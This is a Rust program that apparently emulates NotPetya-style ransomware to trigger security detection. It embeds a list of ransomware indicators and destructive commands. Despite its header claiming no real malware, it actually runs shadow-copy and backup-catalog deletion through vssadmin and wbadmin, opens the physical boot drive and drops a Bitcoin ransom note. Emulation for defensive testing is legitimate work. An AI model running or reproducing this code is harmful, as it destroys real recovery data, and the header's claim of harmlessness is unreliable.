//! Threat: NotPetya Locker
//! DOES NOT CONTAIN REAL MALWARE OR ENCRYPTION.

use std::env;
use std::fs::File;
use std::io::Write;
use std::path::PathBuf;
use std::process::Command;

fn main() {
    // FAKE IOCs FOR STATIC ANALYSIS DETECTION
    #[allow(dead_code)]
    let static_iocs = [
        "WanaCrypt0r",
        "LockBit",
        "DarkSide",
        "REvil",
        "vssadmin.exe delete shadows /all /quiet",
        "wbadmin DELETE SYSTEMSTATEBACKUP",
        "bcdedit /set {default} recoveryenabled No",
        "taskkill /f /im",
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "crypto_keys_encrypted.rsa",
    ];
    std::hint::black_box(static_iocs);

    println!("==================================================");
    println!(" [+] NotPetya Payload Executing...");
    println!("==================================================");

    // 1. Execute vssadmin
    println!("[*] Executing vssadmin.exe to delete Volume Shadow Copies...");
    if let Ok(mut child) = Command::new("vssadmin.exe").args(&["delete", "shadows", "/all", "/quiet"]).spawn() {
        std::thread::sleep(std::time::Duration::from_secs(5)); // Sleep WHILE the child is alive
        let _ = child.wait(); // Wait for it to finish
    }

    // 2. Execute wbadmin
    println!("[*] Executing wbadmin.exe to delete Windows Backup catalogs...");
    if let Ok(mut child) = Command::new("wbadmin.exe").args(&["delete", "catalog", "-quiet"]).spawn() {
        std::thread::sleep(std::time::Duration::from_secs(5)); // Sleep WHILE the child is alive
        let _ = child.wait(); // Wait for it to finish
    }

    // 3. Attempt a dummy write to \Device\HarddiskVolume1 (MBR Ring 0 protection)
    println!("[*] Overwriting Master Boot Record (MBR)...");
    if let Ok(_) = File::open("\\\\.\\PhysicalDrive0") {
        // Read access successful
    }

    // 4. Drop Ransom Note
    let user_profile = env::var("USERPROFILE").unwrap_or_else(|_| "C:\\Users\\Public".to_string());
    let mut desktop = PathBuf::from(user_profile);
    desktop.push("Desktop");
    let note_path = desktop.join("README_LOCKED.txt");
    
    println!("[*] Dropping ransom note...");
    if let Ok(mut file) = File::create(&note_path) {
        let _ = file.write_all(b"Oops, your files have been encrypted! Send 300$ worth of Bitcoin...");
    }
    
    println!("[+] Target system destroyed and unbootable.");
    
    // Sustained Execution (The Cryo-Stasis Target)
    std::thread::sleep(std::time::Duration::from_secs(20));
}